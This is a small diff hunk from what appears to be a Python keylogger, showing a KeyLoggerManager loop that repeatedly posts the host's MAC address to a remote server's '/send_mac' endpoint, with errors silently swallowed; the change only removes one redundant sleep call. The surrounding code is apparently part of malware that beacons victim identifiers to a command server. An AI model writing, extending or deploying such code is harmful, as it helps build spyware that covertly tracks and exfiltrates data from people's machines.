@@ -30,7 +30,6 @@ class KeyLoggerManager:
             try:
                 res = requests.post(server_link + '/send_mac', data=get_mac_address())
                 res_status = res.status_code
-                time.sleep(3)
             except:
                 pass
             time.sleep(3)
